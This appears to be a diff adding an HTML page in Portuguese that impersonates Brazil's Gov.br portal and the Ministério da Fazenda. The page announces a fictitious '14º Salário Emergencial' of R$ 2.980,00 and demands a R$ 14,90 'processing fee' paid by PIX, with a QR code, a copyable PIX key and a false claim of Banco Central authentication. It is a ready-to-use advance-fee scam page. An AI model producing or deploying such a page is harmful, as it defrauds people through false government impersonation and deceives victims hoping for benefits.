@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Gov.br - Detalhamento de Benefício</title>
+    <style>
+        body { font-family: 'Rawline', sans-serif, Arial; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
+        
+        /* Cabeçalho Padrão Gov */
+        .gov-bar { background: #fff; padding: 12px 20px; border-bottom: 2px solid #004088; display: flex; align-items: center; justify-content: space-between; }
+        .gov-bar img { height: 24px; }
+
+        .container { max-width: 550px; margin: 20px auto; padding: 10px; }
+
+        /* Card de Informação */
+        .card { background: white; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border-top: 5px solid #1d8032; padding: 25px; margin-bottom: 20px; }
+        
+        .status-top { background: #e7f4e8; color: #1d8032; padding: 8px; border-radius: 4px; font-weight: bold; font-size: 13px; display: inline-block; margin-bottom: 15px; }
+
+        h1 { font-size: 18px; color: #004088; margin: 0 0 20px 0; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+
+        /* Estilo Extrato */
+        .extrato-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
+        .extrato-table td { padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
+        .extrato-table td.label { color: #666; }
+        .extrato-table td.value { text-align: right; font-weight: bold; }
+
+        .total-box { background: #f8f9fa; padding: 20px; border-radius: 4px; text-align: center; border: 1px solid #ddd; }
+        .total-label { font-size: 12px; color: #555; display: block; }
+        .total-value { font-size: 32px; color: #1d8032; font-weight: 800; }
+
+        /* Área de Arrecadação (Pagamento) */
+        .payment-section { background: #fff; border: 1px solid #ddd; border-top: 5px solid #004088; border-radius: 4px; padding: 25px; }
+        .payment-title { font-size: 16px; font-weight: bold; color: #333; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
+
+        .tax-info { background: #fff9e6; border-left: 4px solid #ffcd07; padding: 15px; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
+
+        .qr-box { text-align: center; margin-bottom: 25px; }
+        .qr-box img { width: 200px; border: 1px solid #eee; padding: 10px; background: #fff; border-radius: 8px; }
+
+        .pix-copy-box { text-align: center; }
+        .pix-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; background: #f8f9fa; font-family: monospace; font-size: 11px; box-sizing: border-box; text-align: center; margin-bottom: 10px; }
+        
+        .btn-copy { 
+            background: #1351b4; color: white; border: none; padding: 16px; width: 100%; 
+            border-radius: 50px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 14px; transition: 0.2s;
+        }
+        .btn-copy:hover { background: #004088; }
+
+        .footer-secure { text-align: center; margin-top: 30px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+
+    <div class="gov-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" alt="Gov.br">
+        <span style="font-size: 11px; font-weight: bold; color: #666;">MINISTÉRIO DA FAZENDA</span>
+    </div>
+
+    <div class="container">
+        
+        <div class="card">
+            <div class="status-top">✓ BENEFÍCIO PRONTO PARA ENVIO</div>
+            <h1>Extrato de Processamento</h1>
+            
+            <table class="extrato-table">
+                <tr>
+                    <td class="label">Descrição do Abono:</td>
+                    <td class="value">14º Salário Emergencial</td>
+                </tr>
+                <tr>
+                    <td class="label">Competência:</td>
+                    <td class="value">2025/2026</td>
+                </tr>
+                <tr>
+                    <td class="label">Forma de Envio:</td>
+                    <td class="value">PIX Instantâneo</td>
+                </tr>
+            </table>
+
+            <div class="total-box">
+                <span class="total-label">VALOR LÍQUIDO DISPONÍVEL</span>
+                <span class="total-value">R$ 2.980,00</span>
+            </div>
+        </div>
+
+        <div class="payment-section">
+            <div class="payment-title">🏛️ Guia de Liberação Digital</div>
+            
+            <div class="tax-info">
+                <strong>Instrução de Desbloqueio:</strong><br>
+                Para autorizar a transferência do valor acima, o segurado deve efetuar o pagamento da <b>Tarifa de Processamento Digital (TPD)</b> no valor de <b>R$ 14,90</b>.
+            </div>
+
+            <div class="qr-box">
+                <p style="font-size: 13px; font-weight: bold; margin-bottom: 15px;">Pague via PIX para liberação imediata:</p>
+                <img src="qrcode.png" alt="QR Code PIX">
+                <p style="font-size: 11px; color: #666; margin-top: 10px;">Utilize o QR Code para pagar pelo Computador</p>
+            </div>
+
+            <div class="pix-copy-box">
+                <p style="font-size: 12px; font-weight: bold; color: #666; margin-bottom: 8px;">OU COPIE O CÓDIGO ABAIXO :</p>
+                <input type="text" value="95a60332-ee2f-4252-8ba7-76162b4eec3e
+" id="pixCode" readonly class="pix-input">
+                
+                <button onclick="copiarPix()" id="btnCopiar" class="btn-copy">
+                    Copiar Código PIX (R$ 14,90)
+                </button>
+            </div>
+        </div>
+
+        <div class="footer-secure">
+            🛡️ <b>Sistema de Pagamentos Integrado (SPI)</b><br>
+            Autenticado pelo Banco Central do Brasil.
+        </div>
+    </div>
+
+    <script>
+        function copiarPix() {
+            var copyText = document.getElementById("pixCode");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            
+            var btn = document.getElementById("btnCopiar");
+            btn.innerHTML = "✓ CÓDIGO COPIADO!";
+            btn.style.background = "#1d8032";
+            
+            setTimeout(function(){
+                btn.innerHTML = "Copiar Código PIX (R$ 14,90)";
+                btn.style.background = "#1351b4";
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
